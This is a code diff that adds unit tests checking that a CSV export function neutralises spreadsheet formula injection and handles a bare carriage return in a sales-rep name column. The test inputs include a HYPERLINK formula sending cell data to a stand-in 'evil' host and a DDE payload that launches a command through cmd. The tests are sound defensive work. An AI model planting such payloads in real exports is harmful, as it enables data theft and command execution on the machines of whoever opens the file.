@@ -153,6 +153,36 @@ describe("toCsv", () => {
   });
 });
 
+describe("toCsv formula injection", () => {
+  const cols = [{ key: "GroupLabel", header: "Rep" }, { key: "Leads", header: "Leads" }];
+
+  // tblUser.FullName is self-service, so the lowest-privileged rep can set it
+  // and a manager opens the export. Quoting alone does not help: Excel strips
+  // the quotes and still evaluates a cell starting "=".
+  it.each([
+    ['=HYPERLINK("http://evil/?d="&A2,"bonus")', "'=HYPERLINK"],
+    ["+1-800-EVIL", "'+1-800-EVIL"],
+    ["-2+3+cmd|' /C calc'!A0", "'-2+3+cmd"],
+    ["@SUM(1+1)", "'@SUM(1+1)"],
+    ["\tLeading tab", "'\tLeading tab"],
+  ])("neutralises %s", (name, startsWith) => {
+    const out = toCsv(cols, [{ GroupLabel: name, Leads: 1 }]).split("\n")[1];
+    const cell = out.startsWith('"') ? out.slice(1) : out;
+    expect(cell.startsWith(startsWith)).toBe(true);
+  });
+
+  it("leaves ordinary text and real negative numbers alone", () => {
+    expect(toCsv(cols, [{ GroupLabel: "Amit Singh", Leads: -5 }])).toBe("Rep,Leads\nAmit Singh,-5");
+  });
+
+  it("quotes a bare carriage return so one name cannot split a row", () => {
+    // A lone CR is a record separator to most parsers: without quoting, one
+    // display name silently becomes two rows and every later column shifts.
+    const out = toCsv(cols, [{ GroupLabel: "Ravi\rKumar", Leads: 2 }]);
+    expect(out).toBe('Rep,Leads\n"Ravi\rKumar",2');
+  });
+});
+
 describe("leadsUrl / drillParams", () => {
   it("builds the Leads list URL without empty values", () => {
     expect(leadsUrl({ SourceId: 11, OwnerId: null, from: "2026-08-01", to: "", BranchId: undefined })).toBe("/sales/leads?SourceId=11&from=2026-08-01");
